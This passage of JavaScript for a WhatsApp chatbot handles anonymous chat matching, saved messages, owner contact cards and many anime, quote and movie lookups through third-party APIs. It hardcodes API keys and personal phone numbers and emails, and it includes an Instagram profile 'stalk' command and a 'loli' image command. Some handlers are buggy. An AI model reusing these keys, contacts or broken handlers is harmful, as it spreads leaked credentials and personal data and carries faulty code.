                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return reply `Tidak ada hash`
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return reply `You have no permission to delete this sticker command`              
                delete global.db.sticker[hash]
                reply(`Done!`)
            }
            break
            case prefix+'listcmd':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                let teks = `
*Hash List*
Info: *bold* hash is locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                Manik.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case prefix+'lockcmd':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!isManik) return reply(mess.owner)
                if (!m.quoted) return reply `Reply Message!`
                if (!m.quoted.fileSha256) return reply `SHA256 Hash Missing`
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return reply `Hash not found in database`
                global.db.sticker[hash].locked = !/^un/i.test(command)
                reply('Done!')
            }
            break
            case prefix+'addmsg':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.quoted) return reply `Reply Message Yang Ingin Disave Di Database`
                if (!text) return reply `Example : ${command} nama file`
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) return reply `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case prefix+'igstalk':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
if(q) m.reply('Username nya mana?')
fetchJson(api('anto','/api/igstalk',{username:q},'apikey')).then(async i =>{
let woi = `*「 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 」*

_Username : ${i.username}_
_Nickname : ${i.fullname}_
_Source : https://instagram.com/${q}_
_Verified : ${i.verified}_
_Followers : ${i.followers}_
_Following : ${i.follow}_
_Categori : ${i.category}_
_Bio : ${i.bio}_`
sendFile(m.chat ,i.thumbnail,woi, m)
})
}
break
            case prefix+'getmsg':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!text) return reply `Example : ${command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) return reply `'${text}' tidak terdaftar di list pesan`
                Manik.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case prefix+'listmsg':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `≻ *Name :* ${i.nama}\n≻ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case prefix+'delmsg': case prefix+'deletemsg':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case prefix+'anonymous':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				
                Manik.sendMessage(m.chat, { caption: `Halo ${pushname}👋, berikut perintah anonymous chat bot

🗒️ ${prefix}anonymous - _melihat perintah yang ada_
🔎 ${prefix}search - _mencari teman bicara_
⏩ ${prefix}skip - _mencari teman lain_
❌ ${prefix}stop - _berhenti sesi chatting_
💌 ${prefix}sendprofile - _mengirim kontak pribadi anda ke teman chat_
⚠️ ${prefix}bug - _mengirim laporan ke pemilik bot_
🔮 ${prefix}owner - _kirim kontak pemilik bot_
👤 ${prefix}author - _kirim kontak pembuat bot_
———————————————————
Note: Owner Tidak Bertanggung Jawab Jika Ada Masalah Antara Pengguna Bot`, image: { url: "./media/anonymous.jpg" }, templateButtons: buttonsAnon, footer: 'ManikBot By Own-Manik√', mentions: [m.sender] })
			break
			}
case prefix+'sendprofile': case prefix+'sendcontact':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: prefix+'start', buttonText: { displayText: 'START' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `_You Are Not In Anonymous Session, Press The Button To Find A Partner_`)
                    throw false
                }
                let profile = await Manik.profilePictureUrl(room.b)
                let status = await Manik.fetchStatus(room.b)
                let msg = await Manik.sendImage(room.a, profile, `Name : ${await Manik.getName(room.b)}\nBio : ${status.status}\nUser : @${room.b.split("@")[0]}`, m, { mentions: [room.b] })
                Manik.sendContact(room.a, [room.b.split("@")[0]], msg)
            }
            break
            case prefix+'stop': case prefix+'keluar': case prefix+'leave':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: prefix+'start', buttonText: { displayText: 'START' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `_You Are Not In Anonymous Session, Press The Button To Find A Partner_`)
                    throw false
                }
                reply('Ok')
                let other = room.other(m.sender)
                if (other) await Manik.sendText(other, `_Partner Has Left Anonymous Session_`, m)
                delete this.anonymous[room.id]
                break
            }
            case prefix+'search': case prefix+'mulai': case prefix+'start':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: prefix+'stop', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `_You Are Still In Anonymous Session, Press The Button Below To Terminate Your Anonymous Session_`, Manik.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: prefix+'next', buttonText: { displayText: 'NEXT' }, type: 1 },
                        { buttonId: prefix+'stop', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await Manik.sendButtonText(room.a, buttons, `_Successfully Found Partner, Now You Can Send Messages_`, Manik.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await Manik.sendButtonText(room.b, buttons, `_Successfully Found Partner, Now You Can Send Messages_`, Manik.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: prefix+'keluar', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `_Please Wait, Looking For A Partner_`, Manik.user.name, m)
                }
                break
            }
            case prefix+'next': case prefix+'skip':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (m.isGroup) return reply('This Feature Cannot Be Used In Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: prefix+'start', buttonText: { displayText: 'START' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press The Button To Find A Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await Manik.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: prefix+'next', buttonText: { displayText: 'NEXT' }, type: 1 },
                        { buttonId: prefix+'keluar', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await Manik.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, Manik.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await Manik.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, Manik.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: prefix+'keluar', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, Manik.user.name, m)
                }
                break
            }
            case prefix+'public':{
            	if (!isManik) return reply(mess.owner)
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!isManik) return reply(mess.owner)
                Manik.public = true
                reply('Successfully Changed To Public Usage')
            }
            break
            case prefix+'self':{
            	if (!isManik) return reply(mess.owner)
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!isManik) return reply(mess.owner)
                Manik.public = false
                reply('Successfully Changed To Self Usage')
            }
            break
			
			//PING
            case prefix+'ping': case prefix+'botstatus': case prefix+'statusbot':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
			 
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

NodeJS Memory Usaage
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
               // reply(respon)
				await reply(`*「 SPEED TEST 」*\nMerespon Dalam ${latensi.toFixed(4)} _Second_`)
            }
            break
            case prefix+'owner': case prefix+'creator':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                let vcard = 'BEGIN:VCARD\n'
    + 'VERSION:3.0\n' 
    + 'N:;Kang;;;'
    + 'FN:Yud\n'
    + 'ORG:Yudha Permana;\n'
    + 'item1.TEL;type=CELL;type=VOICE;waid=6283155997772:+62 831-5599-7772\n' 
    + 'item1.X-ABLabel:Creator Yudha BOT\n'
    + 'item2.EMAIL;type=INTERNET:flasherdeveloper@gmail.com\n'
    + 'item2.X-ABLabel:Email\n'
    + 'item3.URL:https://instagram.com/\n'
    + 'item3.X-ABLabel:Instagram\n'
    + 'item4.ADR:;;Cianjur;;;;\n'
    + 'item4.X-ABLabel:Region\n'
    + 'END:VCARD'
Manik.sendMessage(m.chat, { contacts: { displayName: 'AryaManik√', contacts: [{ vcard }] } }, { quoted: m })
            }
            break            
            case prefix+'author':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                let vcard = 'BEGIN:VCARD\n'
    + 'VERSION:3.0\n' 
    + 'N:;Manik;;;'
    + 'FN:Manik\n'
    + 'ORG:Arya Manik;\n'
    + 'item1.TEL;type=CELL;type=VOICE;waid=6283155997772:+62 857-3713-4572\n' 
    + 'item1.X-ABLabel:Creator Manik Bott\n'
    + 'item2.EMAIL;type=INTERNET:aryamanik107@gmail.com\n'
    + 'item2.X-ABLabel:Email\n'
    + 'item3.URL:https://instagram.com/aryamanik___\n'
    + 'item3.X-ABLabel:Instagram\n'
    + 'item4.ADR:;;Indonesia;;;;\n'
    + 'item4.X-ABLabel:Region\n'
    + 'END:VCARD'
Manik.sendMessage(m.chat, { contacts: { displayName: 'Arya Manik', contacts: [{ vcard }] } }, { quoted: m })
reply('Hai Kak Ini Adalah Nomor Author Saya')
            }
            break            
                    case prefix+'bug': case prefix+'report':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                    	if(!text) return reply `Enter The Bug Example\n\n${command.slice(1)} Menu Error `
                    	Manik.sendMessage('6283155997772@s.whatsapp.net', {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
Report Message: ${text}` })
reply(`Successfully Reported To The Owner\n\nPlease Make Sure The Bug Is Valid, If You Play With This, Use This Feature Again And Again For No Reason, You Will Be Blocked For Sure !`)
                    }
                    break 


//================================>ADD FITUR BY MANIK<================================//
case prefix+'loli':
       case prefix+'husbu':
       case prefix+'milf':
       case prefix+'cosplay':
       case prefix+'wallml':
       addCountCmd(`#${command.slice(1)}`, sender, _cmd)
              /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://Hikari.github.io`)
              let wipu = await fetchJson(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command.slice(1)}.json`)
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              lolis = await getBuffer(wipi)
              Manik.sendImage(m.chat, lolis, `Nih Kak`, m)
              break
			  
			  
            case prefix+'halah': case prefix+'hilih': case prefix+'huluh': case prefix+'heleh': case prefix+'holoh': 
            if (!m.quoted && !text) return reply(`Send/reply text with caption ${command}`)
            ter = command[2].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
			
			
case prefix+'ocr':{
	
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	        if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./FuncBot/uploader')
                let media = await Manik.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                }
                await fs.unlinkSync(media)
            
						let wihu = await fetchJson(`https://api.lolhuman.xyz/api/ocr?apikey=SadTeams&img=${util.format(anu)}`)
						reply(wihu.result)
						}
					break
case prefix+'manga':
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
              if (!text) return reply `Example : ${command} black rover`
              reply('Tunggu Ya Kakak, ManikBot Carikan')
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${lolkey}&query=${text}`)
              get_result = get_result.result
              ini_txt = `Id : ${get_result.id}\n`
              ini_txt += `Id MAL : ${get_result.idMal}\n`
              ini_txt += `Title : ${get_result.title.romaji}\n`
              ini_txt += `English : ${get_result.title.english}\n`
              ini_txt += `Native : ${get_result.title.native}\n`
              ini_txt += `Format : ${get_result.format}\n`
              ini_txt += `Chapters : ${get_result.chapters}\n`
              ini_txt += `Volume : ${get_result.volumes}\n`
              ini_txt += `Status : ${get_result.status}\n`
              ini_txt += `Source : ${get_result.source}\n`
              ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
              ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
              ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
              ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
              ini_txt += `Score : ${get_result.averageScore}%\n`
              ini_txt += `Characters : \n`
              ini_character = get_result.characters.nodes
              for (var x of ini_character) {
              ini_txt += `- ${x.name.full} (${x.name.native})\n`
}
              ini_txt += `\nDescription : ${get_result.description}`
              buff = await getBuffer(get_result.coverImage.large)
              Manik.sendImage(m.chat, buff, `${ini_txt}`, m)
         break
         case prefix+'anime':
             if (!text) return reply `Example : ${command} black rover`
             reply('Tunggu Ya Kakak, ManikBot Carikan')
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${lolkey}&query=${text}`)
             get_result = get_result.result
             ini_txt = `Id : ${get_result.id}\n`
             ini_txt += `Id MAL : ${get_result.idMal}\n`
             ini_txt += `Title : ${get_result.title.romaji}\n`
             ini_txt += `English : ${get_result.title.english}\n`
             ini_txt += `Native : ${get_result.title.native}\n`
             ini_txt += `Format : ${get_result.format}\n`
             ini_txt += `Episodes : ${get_result.episodes}\n`
             ini_txt += `Duration : ${get_result.duration} mins.\n`
             ini_txt += `Status : ${get_result.status}\n`
             ini_txt += `Season : ${get_result.season}\n`
             ini_txt += `Season Year : ${get_result.seasonYear}\n`
             ini_txt += `Source : ${get_result.source}\n`
             ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
             ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
             ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
             ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
             ini_txt += `Score : ${get_result.averageScore}%\n`
             ini_txt += `Characters : \n`
             ini_character = get_result.characters.nodes
             for (var x of ini_character) {
             ini_txt += `- ${x.name.full} (${x.name.native})\n`
 }
             ini_txt += `\nDescription : ${get_result.description}`
             thumbnail = await getBuffer(get_result.coverImage.large)
             Manik.sendImage(m.chat, thumbnail, `${ini_txt}`, m)
             break
      case prefix+'kusonime':
             if (!text) return reply `Example : ${command} black rover`
             reply('Tunggu Ya Kakak, ManikBot Carikan')
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${query}`)
             get_result = get_result.result
             ini_txt = `Title : ${get_result.title}\n`
             ini_txt += `Japanese : ${get_result.japanese}\n`
             ini_txt += `Genre : ${get_result.genre}\n`
             ini_txt += `Seasons : ${get_result.seasons}\n`
             ini_txt += `Producers : ${get_result.producers}\n`
             ini_txt += `Type : ${get_result.type}\n`
             ini_txt += `Status : ${get_result.status}\n`
             ini_txt += `Total Episode : ${get_result.total_episode}\n`
             ini_txt += `Score : ${get_result.score}\n`
             ini_txt += `Duration : ${get_result.duration}\n`
             ini_txt += `Released On : ${get_result.released_on}\n`
             ini_txt += `Desc : ${get_result.desc}\n`
             link_dl = get_result.link_dl
             for (var x in link_dl) {
             ini_txt += `\n${x}\n`
             for (var y in link_dl[x]) {
             ini_txt += `${y} - ${link_dl[x][y]}\n`
}
}
             ini_buffer = await getBuffer(get_result.thumbnail)
             Manik.sendImage(m.chat, ini_buffer, `${ini_txt}`, m)
             break
       case prefix+'otakudesu':
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
              if (!text) return reply `Example : ${command} black rover`
             reply('Tunggu Ya Kakak, ManikBot Carikan')
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${query}`)
              get_result = get_result.result
              ini_txt = `Title : ${get_result.title}\n`
              ini_txt += `Japanese : ${get_result.japanese}\n`
              ini_txt += `Judul : ${get_result.judul}\n`
              ini_txt += `Type : ${get_result.type}\n`
              ini_txt += `Episode : ${get_result.episodes}\n`
              ini_txt += `Aired : ${get_result.aired}\n`
              ini_txt += `Producers : ${get_result.producers}\n`
              ini_txt += `Genre : ${get_result.genres}\n`
              ini_txt += `Duration : ${get_result.duration}\n`
              ini_txt += `Studios : ${get_result.status}\n`
              ini_txt += `Rating : ${get_result.rating}\n`
              ini_txt += `Credit : ${get_result.credit}\n`
              get_link = get_result.link_dl
              for (var x in get_link) {
              ini_txt += `\n\n*${get_link[x].title}*\n`
              for (var y in get_link[x].link_dl) {
              ini_info = get_link[x].link_dl[y]
              ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
              ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
              ini_txt += `\`\`\`Link : \`\`\`\n`
              down_link = ini_info.link_dl
              for (var z in down_link) {
              ini_txt += `${z} - ${down_link[z]}\n`
}
}
}
              reply(ini_txt)
              break
              case prefix+'neko':
       case prefix+'kanna':
       case prefix+'sagiri':
       case prefix+'megumin':
       case prefix+'wallnime':
       addCountCmd(`#${command.slice(1)}`, sender, _cmd)
              reply('Tunggu Ya Kak??, ManikBot Carikan')
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command.slice(1)}?apikey=${lolkey}`)
              Manik.sendImage(m.chat, buff, `Nih Kak`, m)
              break
       
       
    
              break
       case prefix+'nakanoitsuki':
       case prefix+'nakanonino':
       case prefix+'nakanomiku':
       addCountCmd(`#${command.slice(1)}`, sender, _cmd)
              reply(mess.wait)
              res = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=${command.slice(1)}`)
              var string = JSON.parse(JSON.stringify(res.data))
              var random =  string[Math.floor(Math.random() * string.length)]
              Manik.sendImage(m.chat, random, `Nih Kak`, m)
              break
              case prefix+'lolkey':
       case prefix+'cekapikey':
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
              if (!text) return reply `Example : ${command} Textnya Mana Kak😡`
              anu = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${text}`)
              teks = `*YOUR APIKEY*\n\n➸ Username= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://api.lolhuman.xyz`
              reply(teks)
              break
       case prefix+'storyanime':
              case prefix+'videoanime':
       addCountCmd(`#${command.slice(1)}`, sender, _cmd)
              reply('Tunggu Ya Kak, ManikBot Carikan')
              anu = await fetchJson(`https://api.lolhuman.xyz/api/storynime?apikey=${lolkey}`)
              Manik.sendMessage(m.chat, { video: { url: anu.result }, mimetype: 'video/mp4', caption: `Nih Kak` }, { quoted: m })
              break
              case prefix+'doujindesu':
             if (!text) return reply `Example : ${command} Textnya Mana Kak😡`
             reply('Tunggu Ya Kakak, ManikBot Carikan')
             try {
             doujinnya = await fetchJson(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${text}&apiKey=administrator`)
             let { data } = await doujinnya
             xixixai = `*Doujindesu Search*\n`
             for (let i = 0; i < data.length; i++) {
             xixixai += `\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`
}
             buffer = await getBuffer(data[0].thumb)
             Manik.sendImage(m.chat, buffer, xixixai, m)
             } catch (e) {
             console.log(e)
             reply(String(e))
}
             break
             case prefix+'otakuongoing':              
               o = await onGoing()
               console.log(o)
               ot = '*「 Ongoing Otakudesu 」*'
               for (let i = 0; i < o.length; i++) {
               ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
}
               buff = await getBuffer(o[0].thumb)
              Manik.sendImage(m.chat, buff, ot, m)
break

case prefix+'quotes':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`)
    quotes = quotes.result
    author = quotes.by
    quotes = quotes.quote
    reply(`_${quotes}_\n\n● ${author}*`)
    break
case prefix+'quotesanime':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolkey}`)
    quotes = quotes.result
    quote = quotes.quote
    char = quotes.character
    anime = quotes.anime
    episode = quotes.episode
    reply(`_${quote}_\n\n*● ${char}*\n*● ${anime} ${episode}*`)
    break
case prefix+'quotesdilan':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quotes/diLan?apikey=${lolkey}`)
    reply(get_result.result)
   break
    break
case prefix+'quotesimage':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command.slice(1)}?apikey=${lolkey}`)
    Manik.sendImage(m.chat, buff, `ManikBot - By ©AryaManik`, m)
 break
case prefix+'faktaunik':
case prefix+'katabijak':
case prefix+'pantun':
case prefix+'bucin':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command.slice(1)}?apikey=${lolkey}`)
   reply(get_result.result)
        break;
    break
case prefix+'randomnama':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${lolkey}`)
   reply(anu.result)
        break;
    break
       // Movie & Story
case prefix+'lk21':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    if (args.length == 0) return reply(`Example: ${command} Transformer`)
    query = args.join(" ")
    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=${lolkey}&query=${query}`)
    get_result = get_result.result
    ini_txt = `Title : ${get_result.title}\n`
    ini_txt += `Link : ${get_result.link}\n`
    ini_txt += `Genre : ${get_result.genre}\n`
    ini_txt += `Views : ${get_result.views}\n`
    ini_txt += `Duration : ${get_result.duration}\n`
    ini_txt += `Tahun : ${get_result.tahun}\n`
    ini_txt += `Rating : ${get_result.rating}\n`
    ini_txt += `Desc : ${get_result.desc}\n`
    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
    ini_txt += `Location : ${get_result.location}\n`
    ini_txt += `Date Release : ${get_result.date_release}\n`
    ini_txt += `Language : ${get_result.Language}\n`
    ini_txt += `Link Download : ${get_result.link_dl}`
    thumbnail = await getBuffer(get_result.thumbnail)
    Manik.sendImage(m.chat, thumbnail, `${ini_txt}`, m)
    break
case prefix+'drakorongoing':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    get_result = await fetchJson(`https://api.lolhuman.xyz/api/drakorongoing?apikey=${lolkey}`)
    get_result = get_result.result
    ini_txt = "Ongoing Drakor\n\n"
    for (var x of get_result) {
        ini_txt += `Title : ${x.title}\n`
        ini_txt += `Link : ${x.link}\n`
        ini_txt += `Thumbnail : ${x.thumbnail}\n`
        ini_txt += `Year : ${x.category}\n`
        ini_txt += `Total Episode : ${x.total_episode}\n`
        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
    }
    reply(ini_txt)
    break
case prefix+'wattpad':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    if (args.length == 0) return reply(`Example: ${command} https://www.wattpad.com/707367860-kumpuLan-quote-tere-liye-tere-liye-quote-quote`)
    ini_url = args[1]
    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=${lolkey}&url=${ini_url}`)
    get_result = get_result.result
    ini_txt = `Title : ${get_result.title}\n`
    ini_txt += `Rating : ${get_result.rating}\n`
    ini_txt += `Motify date : ${get_result.modifyDate}\n`
    ini_txt += `Create date: ${get_result.createDate}\n`
    ini_txt += `Word : ${get_result.word}\n`
    ini_txt += `Comment : ${get_result.comment}\n`
    ini_txt += `Vote : ${get_result.vote}\n`
    ini_txt += `Reader : ${get_result.reader}\n`
    ini_txt += `Pages : ${get_result.pages}\n`
    ini_txt += `Description : ${get_result.desc}\n\n`
    ini_txt += `Story : \n${get_result.story}`
    thumbnail = await getBuffer(get_result.photo)
